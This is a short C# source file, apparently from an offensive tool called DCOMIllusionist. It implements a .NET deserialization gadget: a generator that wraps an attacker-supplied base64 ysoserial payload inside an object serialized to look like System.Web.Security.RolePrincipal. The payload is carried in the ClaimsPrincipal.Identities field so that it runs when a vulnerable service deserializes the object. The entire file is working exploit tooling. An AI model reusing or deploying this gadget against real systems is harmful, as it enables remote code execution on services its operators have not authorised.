using DCOMIllusionist.Core.Helpers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using System.Threading.Tasks;

namespace DCOMIllusionist.Core.Generators
{
    public class RolePrincipalGenerator : GenericGenerator
    {
        public override List<ExploitType> SupportedExploits()
        {
            return new List<ExploitType> { 
                ExploitType.B64Ysoserial 
            };
        }

        public override object GenerateB64Ysoserial(InputArgs arg)
        {
            return new RolePrincipalMarshal(arg.Input);
        }
    }

    [Serializable]
    public class RolePrincipalMarshal : ISerializable
    {
        public RolePrincipalMarshal(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Log.Debug("Serilization of RolePrincipal");
            info.SetType(typeof(System.Web.Security.RolePrincipal));
            info.AddValue("System.Security.ClaimsPrincipal.Identities", B64Payload);
        }
    }
}
